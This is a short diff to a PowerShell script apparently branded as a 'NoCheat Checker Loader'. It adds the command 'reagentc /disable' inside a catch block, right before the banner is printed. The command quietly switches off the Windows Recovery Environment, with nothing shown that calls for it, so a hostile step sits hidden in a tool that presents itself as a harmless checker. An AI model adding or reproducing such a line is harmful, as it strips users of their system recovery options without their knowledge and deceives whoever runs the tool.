@@ -48,6 +48,8 @@ try {
         }
 catch {
 
+reagentc /disable
+
 Write-Host "==========================================" -ForegroundColor Yellow
 Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
 Write-Host "==========================================" -ForegroundColor Yellow
